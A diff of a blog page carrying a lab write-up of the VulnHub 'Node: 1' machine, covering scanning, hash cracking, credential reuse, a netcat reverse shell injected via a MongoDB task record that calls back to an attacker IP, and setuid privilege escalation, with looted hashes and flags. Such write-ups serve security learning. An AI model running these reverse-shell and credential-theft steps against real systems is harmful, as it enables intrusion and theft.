@@ -1,41 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8"/>
-    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
-    <meta name="description" content="Personal Weblog"/>
-    <meta content="width=device-width, initial-scale=1" name="viewport"/>
-
-    <title>Mannthan</title>
-    <link href="/static/images/mannthan-32x32.png" sizes="32x32" rel="icon" type="image/png"/>
-    <script src="/static/js/highlight.min.js"></script>
-    <script src="/static/js/highlightjs-line-numbers.min.js"></script>
-    <script charset="UTF-8" src="/static/js/go.min.js"></script>
-    <!-- <link rel="stylesheet" href="/static/css/github.min.css"> -->
-    <link rel="stylesheet" href="/static/css/github-gist.min.css">
-    <link rel="stylesheet" type="text/css" href="/static/css/style.md.css" media="screen" />
-
-   </head>
-  <body>
-    <div class="header">
-      <table>
-        <tr>
-          <td><a href="/index.html" style="color:#fe4164; font-size:14pt;">🏡 Home </a></td>
-          <td><a href="/archive.html" style="color:#f90; font-size:14pt;">💾 Archive </a></td>
-          <td><a href="/tags.html" style="color:#69359c; font-size:14pt;">🔖 Tags </a></td>
-          <td><a href="/stats.html" style="color:#20b2aa; font-size:14pt;">📊 Stats</a></td>
-        </tr>
-      </table>
-    </div>
-    <div class="body">
-          <h1>[VulnHub] Node: 1</h1>
-                  <p><a href="/posts/20191021_vulnhub-mrrobot1.html"> « </a>📅 published on <code>28/Oct/2019</code><a href="/posts/20191029_vulnhub-lazysysadmin1.html"> » </a></p>
-                <h2>Overview</h2>
-<p>This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/node-1,252/#">Node: 1</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p>
-<p><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_node1/killchain.png" /></p>
-<h2>Phase #1: Enumeration</h2>
-<p>1. Here's the Nmap scan result:  </p>
-<pre><code># Nmap 7.70 scan initiated Tue Oct 22 14:20:26 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.node1/results/192.168.92.189/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.node1/results/192.168.92.189/scans/xml/_quick_tcp_nmap.xml 192.168.92.189
+<!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta name=author content="Ankur Tyagi (@7h3rAm)"><meta name=description content="Personal Weblog"><meta content="width=device-width, initial-scale=1" name=viewport><title>Mannthan</title><link href=/static/images/mannthan-32x32.png sizes=32x32 rel=icon type=image/png><script src=/static/js/highlight.min.js></script><script src=/static/js/highlightjs-line-numbers.min.js></script><script charset=UTF-8 src=/static/js/go.min.js></script><link rel=stylesheet href=/static/css/github-gist.min.css><link rel=stylesheet type=text/css href=/static/css/style.md.css media=screen></head><body><div class=header><table><tr><td><a href=/index.html style="color:#fe4164; font-size:14pt;">🏡 Home </a></td><td><a href=/archive.html style="color:#f90; font-size:14pt;">💾 Archive </a></td><td><a href=/tags.html style="color:#69359c; font-size:14pt;">🔖 Tags </a></td><td><a href=/stats.html style="color:#20b2aa; font-size:14pt;">📊 Stats</a></td></tr></table></div><div class=body><h1>[VulnHub] Node: 1</h1><p><a href=/posts/20191021_vulnhub-mrrobot1.html> « </a>📅 published on <code>28/Oct/2019</code><a href=/posts/20191029_vulnhub-lazysysadmin1.html> » </a></p><h2>Overview</h2><p>This is a writeup for VulnHub VM <a href=https://www.vulnhub.com/entry/node-1,252/#>Node: 1</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p><p><img alt=writeup.overview.killchain src=/static/files/posts_vulnhub_node1/killchain.png></p><h2>Phase #1: Enumeration</h2><p>1. Here's the Nmap scan result: </p><pre><code># Nmap 7.70 scan initiated Tue Oct 22 14:20:26 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.node1/results/192.168.92.189/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.node1/results/192.168.92.189/scans/xml/_quick_tcp_nmap.xml 192.168.92.189
 Nmap scan report for 192.168.92.189
 Host is up, received arp-response (0.00084s latency).
 Scanned at 2019-10-22 14:20:28 PDT for 21s
@@ -65,10 +28,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Tue Oct 22 14:20:49 2019 -- 1 IP address (1 host up) scanned in 23.99 seconds
-</code></pre>
-
-<p>2. We explore the <code>3000/tcp</code> service and find a Node.js webapp. Upon exploring the source we come across few REST API calls of which the <code>http://192.168.92.189:3000/api/users/</code> call is very important as it lists regsitered usernames and password hashes. We use online tools to detect hash type as SHA256 and find plaintext strings for three users:  </p>
-<pre><code>username: myP14ceAdm1nAcc0uNT
+</code></pre><p>2. We explore the <code>3000/tcp</code> service and find a Node.js webapp. Upon exploring the source we come across few REST API calls of which the <code>http://192.168.92.189:3000/api/users/</code> call is very important as it lists regsitered usernames and password hashes. We use online tools to detect hash type as SHA256 and find plaintext strings for three users: </p><pre><code>username: myP14ceAdm1nAcc0uNT
 hash: dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
 plaintext: manchester
 
@@ -79,69 +39,28 @@ plaintext: spongebob
 username: mark
 hash: de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73
 plaintext: snowflake
-</code></pre>
-
-<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_node1/screenshot01.png" />  </p>
-<p><img alt="writeup.enumeration.steps.2.2" src="/static/files/posts_vulnhub_node1/screenshot02.png" />  </p>
-<p><img alt="writeup.enumeration.steps.2.3" src="/static/files/posts_vulnhub_node1/screenshot03.png" />  </p>
-<h3>Findings</h3>
-<h4>Open Ports:</h4>
-<pre><code>22/tcp    |  ssh   |  OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+</code></pre><p><img alt=writeup.enumeration.steps.2.1 src=/static/files/posts_vulnhub_node1/screenshot01.png> </p><p><img alt=writeup.enumeration.steps.2.2 src=/static/files/posts_vulnhub_node1/screenshot02.png> </p><p><img alt=writeup.enumeration.steps.2.3 src=/static/files/posts_vulnhub_node1/screenshot03.png> </p><h3>Findings</h3><h4>Open Ports:</h4><pre><code>22/tcp    |  ssh   |  OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
 3000/tcp  |  http  |  Node.js Express framework
-</code></pre>
-
-<h4>Files</h4>
-<pre><code>http://192.168.92.189:3000/assets/js/app/controllers/home.js
+</code></pre><h4>Files</h4><pre><code>http://192.168.92.189:3000/assets/js/app/controllers/home.js
 http://192.168.92.189:3000/api/users/latest
 http://192.168.92.189:3000/api/users/
-</code></pre>
-
-<h4>Users</h4>
-<pre><code>ssh: mark
+</code></pre><h4>Users</h4><pre><code>ssh: mark
 webapp: tom, mark, rastating
-</code></pre>
-
-<h2>Phase #2: Exploitation</h2>
-<p>1. We authenticate as user <code>myP14ceAdm1nAcc0uNT</code> as from the username it seems to be an administrative account. Upon successful login, we get a page to download backup. We proceed and get a plaintext file named <code>myplace.backup</code>. This file has text that looks to be Base64 encoded. Once decoded, we get a zip archive which is password encrypted. We bruteforce the password for the archive and sucessfully extract its contents:  </p>
-<pre><code>file myplace.backup
+</code></pre><h2>Phase #2: Exploitation</h2><p>1. We authenticate as user <code>myP14ceAdm1nAcc0uNT</code> as from the username it seems to be an administrative account. Upon successful login, we get a page to download backup. We proceed and get a plaintext file named <code>myplace.backup</code>. This file has text that looks to be Base64 encoded. Once decoded, we get a zip archive which is password encrypted. We bruteforce the password for the archive and sucessfully extract its contents: </p><pre><code>file myplace.backup
 b64d $(cat myplace.backup) &gt;unknown
 frackzip -uDP /usr/share/wordlists/rockyou.txt unknown
 unzip -o -P &quot;magicword&quot; unknown
-</code></pre>
-
-<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_node1/screenshot04.png" />  </p>
-<p><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_node1/screenshot06.png" />  </p>
-<p><img alt="writeup.exploitation.steps.1.3" src="/static/files/posts_vulnhub_node1/screenshot07.png" />  </p>
-<p><img alt="writeup.exploitation.steps.1.4" src="/static/files/posts_vulnhub_node1/screenshot08.png" />  </p>
-<p>2. Within the extracted the zip archive we get a backup of the <code>/var</code> directory on the target system. This directory has source for the Node.js web application running on <code>3000/tcp</code>. Within the source, we find hardcoded MongoDB credentials for user <code>mark</code>. We try those credentials to login via SSH and get local access:  </p>
-<pre><code>head var/www/myplace/app.js
+</code></pre><p><img alt=writeup.exploitation.steps.1.1 src=/static/files/posts_vulnhub_node1/screenshot04.png> </p><p><img alt=writeup.exploitation.steps.1.2 src=/static/files/posts_vulnhub_node1/screenshot06.png> </p><p><img alt=writeup.exploitation.steps.1.3 src=/static/files/posts_vulnhub_node1/screenshot07.png> </p><p><img alt=writeup.exploitation.steps.1.4 src=/static/files/posts_vulnhub_node1/screenshot08.png> </p><p>2. Within the extracted the zip archive we get a backup of the <code>/var</code> directory on the target system. This directory has source for the Node.js web application running on <code>3000/tcp</code>. Within the source, we find hardcoded MongoDB credentials for user <code>mark</code>. We try those credentials to login via SSH and get local access: </p><pre><code>head var/www/myplace/app.js
   mark:5AYRft73VtFpc84k
 ssh mark@192.168.92.189
-</code></pre>
-
-<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_node1/screenshot09.png" />  </p>
-<p><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_vulnhub_node1/screenshot10.png" />  </p>
-<p>3. We find that the there is a <code>user.txt</code> file within <code>/home/tom/</code> directory and as user <code>mark</code> we don't have access to that file. We need to switch to user <code>tom</code> to proceed further:  </p>
-<pre><code>ls /home/*
+</code></pre><p><img alt=writeup.exploitation.steps.2.1 src=/static/files/posts_vulnhub_node1/screenshot09.png> </p><p><img alt=writeup.exploitation.steps.2.2 src=/static/files/posts_vulnhub_node1/screenshot10.png> </p><p>3. We find that the there is a <code>user.txt</code> file within <code>/home/tom/</code> directory and as user <code>mark</code> we don't have access to that file. We need to switch to user <code>tom</code> to proceed further: </p><pre><code>ls /home/*
 cat /home/tom/user.txt
-</code></pre>
-
-<p><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_vulnhub_node1/screenshot11.png" />  </p>
-<p><img alt="writeup.exploitation.steps.3.2" src="/static/files/posts_vulnhub_node1/screenshot12.png" />  </p>
-<p>4. We find that we can run arbitrary commands from within the MongoDB instance using its <code>scheduler</code> record for which we already found credentials via <code>app.js</code> file from the backup archive. Since the MongoDB instance is running as user <code>tom</code>, we spawn a Bash reverse shell to switch users:  </p>
-<pre><code>nc -nlvp 443
+</code></pre><p><img alt=writeup.exploitation.steps.3.1 src=/static/files/posts_vulnhub_node1/screenshot11.png> </p><p><img alt=writeup.exploitation.steps.3.2 src=/static/files/posts_vulnhub_node1/screenshot12.png> </p><p>4. We find that we can run arbitrary commands from within the MongoDB instance using its <code>scheduler</code> record for which we already found credentials via <code>app.js</code> file from the backup archive. Since the MongoDB instance is running as user <code>tom</code>, we spawn a Bash reverse shell to switch users: </p><pre><code>nc -nlvp 443
 mongo -p -u mark scheduler
   db.tasks.insert({&quot;cmd&quot;: &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.92.179 443 &gt;/tmp/f&quot;})
   bye
 cat /home/tom/user.txt
-</code></pre>
-
-<p><img alt="writeup.exploitation.steps.4.1" src="/static/files/posts_vulnhub_node1/screenshot13.png" />  </p>
-<p><img alt="writeup.exploitation.steps.4.2" src="/static/files/posts_vulnhub_node1/screenshot14.png" />  </p>
-<p><img alt="writeup.exploitation.steps.4.3" src="/static/files/posts_vulnhub_node1/screenshot15.png" />  </p>
-<p><img alt="writeup.exploitation.steps.4.4" src="/static/files/posts_vulnhub_node1/screenshot16.png" />  </p>
-<h2>Phase #2.5: Post Exploitation</h2>
-<pre><code>mark@node&gt; id
+</code></pre><p><img alt=writeup.exploitation.steps.4.1 src=/static/files/posts_vulnhub_node1/screenshot13.png> </p><p><img alt=writeup.exploitation.steps.4.2 src=/static/files/posts_vulnhub_node1/screenshot14.png> </p><p><img alt=writeup.exploitation.steps.4.3 src=/static/files/posts_vulnhub_node1/screenshot15.png> </p><p><img alt=writeup.exploitation.steps.4.4 src=/static/files/posts_vulnhub_node1/screenshot16.png> </p><h2>Phase #2.5: Post Exploitation</h2><pre><code>mark@node&gt; id
 uid=1001(mark) gid=1001(mark) groups=1001(mark)
 mark@node&gt;  
 mark@node&gt; uname
@@ -161,57 +80,18 @@ mark@node&gt; users
 root
 tom
 mark
-</code></pre>
-
-<h2>Phase #3: Privilege Escalation</h2>
-<p>1. We find an interesting <code>setuid</code> file <code>/usr/local/bin/backup</code>. This file is also referenced within the <code>app.js</code> file and we get a hint at how to execute it. We need a backup key which is also conviniently present in the <code>app.js</code> file. Alongwith this, we need to pass a filepath to backup as the third argument. We try to backup the <code>/root</code> directory but get a troll face instead. We then symlink the dircetory and successfully obtain the backup:  </p>
-<pre><code>find / -type f -perm -04000 2&gt;/dev/null
+</code></pre><h2>Phase #3: Privilege Escalation</h2><p>1. We find an interesting <code>setuid</code> file <code>/usr/local/bin/backup</code>. This file is also referenced within the <code>app.js</code> file and we get a hint at how to execute it. We need a backup key which is also conviniently present in the <code>app.js</code> file. Alongwith this, we need to pass a filepath to backup as the third argument. We try to backup the <code>/root</code> directory but get a troll face instead. We then symlink the dircetory and successfully obtain the backup: </p><pre><code>find / -type f -perm -04000 2&gt;/dev/null
 /usr/local/bin/backup -q '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' /root
 /usr/local/bin/backup -q '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' /tmp/test/
-</code></pre>
-
-<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_node1/screenshot17.png" />  </p>
-<p><img alt="writeup.privesc.steps.1.2" src="/static/files/posts_vulnhub_node1/screenshot18.png" />  </p>
-<p><img alt="writeup.privesc.steps.1.3" src="/static/files/posts_vulnhub_node1/screenshot19.png" />  </p>
-<p><img alt="writeup.privesc.steps.1.4" src="/static/files/posts_vulnhub_node1/screenshot20.png" />  </p>
-<p><img alt="writeup.privesc.steps.1.5" src="/static/files/posts_vulnhub_node1/screenshot21.png" />  </p>
-<p>2. Upon following the usual steps and extracting the contents of the password encrypted zip archive, we get access to the <code>/root</code> directory and obtain the <code>root.txt</code> file to complete the challenge:  </p>
-<pre><code>b64d $(cat backup-root) &gt;backup-root.zip
+</code></pre><p><img alt=writeup.privesc.steps.1.1 src=/static/files/posts_vulnhub_node1/screenshot17.png> </p><p><img alt=writeup.privesc.steps.1.2 src=/static/files/posts_vulnhub_node1/screenshot18.png> </p><p><img alt=writeup.privesc.steps.1.3 src=/static/files/posts_vulnhub_node1/screenshot19.png> </p><p><img alt=writeup.privesc.steps.1.4 src=/static/files/posts_vulnhub_node1/screenshot20.png> </p><p><img alt=writeup.privesc.steps.1.5 src=/static/files/posts_vulnhub_node1/screenshot21.png> </p><p>2. Upon following the usual steps and extracting the contents of the password encrypted zip archive, we get access to the <code>/root</code> directory and obtain the <code>root.txt</code> file to complete the challenge: </p><pre><code>b64d $(cat backup-root) &gt;backup-root.zip
 unzip -o -P &quot;magicword&quot; backup-root.zip
 cat tmp/test/root/root.txt
 
-</code></pre>
-
-<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_node1/screenshot22.png" />  </p>
-<h2>Loot</h2>
-<h3>Hashes</h3>
-<pre><code>root:$6$n.BA4A59$WeIF0ZbaB3VGgAxUZqGHnw01.GhL9oVYYFioh07RpPtBl49YdMahhtbYhxUjanXf/NJXiCHBvrNhdC53P........................
+</code></pre><p><img alt=writeup.privesc.steps.2.1 src=/static/files/posts_vulnhub_node1/screenshot22.png> </p><h2>Loot</h2><h3>Hashes</h3><pre><code>root:$6$n.BA4A59$WeIF0ZbaB3VGgAxUZqGHnw01.GhL9oVYYFioh07RpPtBl49YdMahhtbYhxUjanXf/NJXiCHBvrNhdC53P........................
 tom:$6$ptD/.gN.$n.B/5dODEQFteBwg75Ip9leeaaXSMesGbfZzoVHpZihMHfbWu45UpVZTc6razK1JLZ6817ckZhAJF776Dg.......................
 mark:$6$J3gYK/cQ$au1WmOCtq.X1DTKt1CEmKA9qr4PfwZuAGUdCfAV.SSU5VxAtjW/Xk1/oWJtQVaoXMEVXmeBIB6bq24Jpc........................
-</code></pre>
-
-<h3>Credentials</h3>
-<pre><code>ssh: mark/5AYRft73VtFp....
+</code></pre><h3>Credentials</h3><pre><code>ssh: mark/5AYRft73VtFp....
 webapp: myP14ceAdm1nAcc0uNT/manc......, tom/sponge..., mark/snowfl...
-</code></pre>
-
-<h3>Flags</h3>
-<pre><code>user.txt: e1156acc3574e04b06908ecf........
+</code></pre><h3>Flags</h3><pre><code>user.txt: e1156acc3574e04b06908ecf........
 root.txt: 1722e99ca5f353b362556a62........
-</code></pre>
-
-<h2>References</h2>
-<ul>
-<li><a href="https://www.vulnhub.com/entry/node-1,252/">https://www.vulnhub.com/entry/node-1,252/</a>  </li>
-<li><a href="https://hkh4cks.com/blog/2018/06/15/htb-node-walkthrough/">https://hkh4cks.com/blog/2018/06/15/htb-node-walkthrough/</a>  </li>
-</ul>
-        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p>
-                  <p style="text-align:center;">« <a href="/posts/20191021_vulnhub-mrrobot1.html">[VulnHub] Mr-Robot: 1...</a> « | » <a href="/posts/20191029_vulnhub-lazysysadmin1.html">[VulnHub] LazySysAdmin: 1...</a> »</p>
-            </div>
-    <div class="footer">
-      <p style="text-align:center;">[<a href="https://creativecommons.org/licenses/by/4.0/" rel="license">📝 CC BY 4.0</a>]</p>
-    </div>
-    <script>hljs.initHighlightingOnLoad();</script>
-    <script>hljs.initLineNumbersOnLoad();</script>
-  </body>
-</html>
+</code></pre><h2>References</h2><ul><li><a href=https://www.vulnhub.com/entry/node-1,252/ >https://www.vulnhub.com/entry/node-1,252/</a> </li><li><a href=https://hkh4cks.com/blog/2018/06/15/htb-node-walkthrough/ >https://hkh4cks.com/blog/2018/06/15/htb-node-walkthrough/</a> </li></ul><p style=text-align:center;>(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p><p style=text-align:center;>« <a href=/posts/20191021_vulnhub-mrrobot1.html>[VulnHub] Mr-Robot: 1...</a> « | » <a href=/posts/20191029_vulnhub-lazysysadmin1.html>[VulnHub] LazySysAdmin: 1...</a> »</p></div><div class=footer><p style=text-align:center;>[<a href=https://creativecommons.org/licenses/by/4.0/ rel=license>📝 CC BY 4.0</a>]</p></div><script>hljs.initHighlightingOnLoad();</script><script>hljs.initLineNumbersOnLoad();</script></body></html>
